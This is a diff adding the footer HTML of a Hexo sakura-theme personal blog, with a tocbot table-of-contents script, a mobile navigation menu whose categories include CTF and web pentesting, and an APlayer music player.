+<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
+<script type="text/javascript">
+/* <![CDATA[ */
+if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2","name":"Unbroken.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+} else {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2","name":"Unbroken.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+}
+/* ]]> */
+
+</script>
+<script>
+$(document).ready(function() {
+  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
+    if ($(".pattern-center").length > 0) { //有图的情况
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -400,
+          scrollSmoothOffset: -85
+      });
+    } else {
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -85,
+          scrollSmoothOffset: -85
+      });
+    }
+    var offsetTop = $('.toc').offset().top - 95;
+    window.onscroll = function() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
+      if (scrollTop >= offsetTop) {
+        $('.toc').addClass('toc-fixed');
+      } else {
+        $('.toc').removeClass('toc-fixed');
+      }
+    }
+  }
+});
+</script>
+
+    <div class="openNav no-select" style="height: 50px;">
+      <div class="iconflat no-select" style="width: 50px; height: 50px;">
+        <div class="icon"></div>
+      </div>
+      <div class="site-branding search-form-submit">
+        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
+      </div>
+    </div>
+  </section>
+  <div id="mo-nav" class="">
+  <div class="m-avatar">
+    <img src="https://cdn.jsdelivr.net/gh/bephplover/cdn@2.7/img/custom/namei.jpg">
+  </div>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">Cupid'sblog</p>
+  <p style="text-align: center; word-spacing: 20px;">
+    
+      
+        <a href="https://github.com/bephplover" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
+      
+        <a href="https://wpa.qq.com/msgrd?v=3&uin=782377128&site=qq&menu=yes" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left:20px"></a>
+      
+    
+  </p>
+  <ul id="menu-new-1" class="menu">
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+            首页
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/archives">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+            归档
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/categories/技术/">
+                  <i class="fa fa-code" aria-hidden="true"></i>
+                  技术
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/内网渗透/">
+                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                  内网渗透
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/编程类/">
+                  <i class="fa fa-cloud-download" aria-hidden="true"></i>
+                  编程学习
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/Linux/">
+                  <i class="fa fa-book" aria-hidden="true"></i>
+                  Linux学习
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/CTF/">
+                  <i class="fa fa-commenting-o" aria-hidden="true"></i>
+                  CTF
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/Web漏洞/">
+                  <i class="fa fa-book" aria-hidden="true"></i>
+                  Web渗透
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="javascript:;">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+            清单
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/tags/悦读/">
+                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                  书单
+                </a>
+              </li>
+            
+              <li>
+                <a href="/music/">
+                  <i class="fa fa-headphones" aria-hidden="true"></i>
+                  歌单
+                </a>
+              </li>
+            
+              <li>
+                <a href="/tags/图集/">
+                  <i class="fa fa-photo" aria-hidden="true"></i>
+                  图集
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/comment/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+            留言板
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/links/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
+            友人帐
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+            关于
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/about/">
+                  <i class="fa fa-meetup" aria-hidden="true"></i>
+                  我？
+                </a>
+              </li>
+            
+              <li>
+                <a href="/theme-sakura/">
+                  <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
+                  主题
+                </a>
+              </li>
+            
+              <li>
+                <a href="/lab/">
+                  <i class="fa fa-cogs" aria-hidden="true"></i>
+                  Lab
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/atom.xml">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
+            RSS
+          </span>
+        </a>
+        
+      </li>
+    
+  </ul>
+  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
+</div>
+<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<style>
+  .aplayer .aplayer-lrc {
+    height: 35px;
+  }
+  .aplayer .aplayer-lrc p{
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 18px !important;
+  }
+  .aplayer .aplayer-lrc p.aplayer-lrc-current{
+    color: #FF1493;
+  }
+  .aplayer.aplayer-narrow .aplayer-body{
+    left: -66px !important;
+  }
+  .aplayer.aplayer-fixed .aplayer-lrc {
+    display: none;
+  }
+  .aplayer .aplayer-lrc.aplayer-lrc-hide {
+      display:none !important;
+  }
+  .aplayer.aplayer-fixed .lrc-show {
+    display: block;
+    background: rgba(255, 255, 255, 0.8);
+  }
+</style>
+<meting-js
+
+    id="2660651585"
+
+    server="netease"
+
+    type="playlist"
+
+    fixed="true"
+
+    autoplay="false"
+
+    loop="all"
+
+    order="random"
+
+    preload="auto"
+
+    volume="0.7"
+
+    mutex="true"
+
+</meting-js>
+<script>
+  $(function(){
+    $('body').on('click', '.aplayer', function(){
+      if($('.aplayer-button').hasClass('aplayer-play')) {
+        $('.aplayer-lrc').removeClass('lrc-show');
+      } else {
+        $('.aplayer-lrc').addClass('lrc-show');
+      }
+    })
+  });
+</script>
+</body>
+</html>
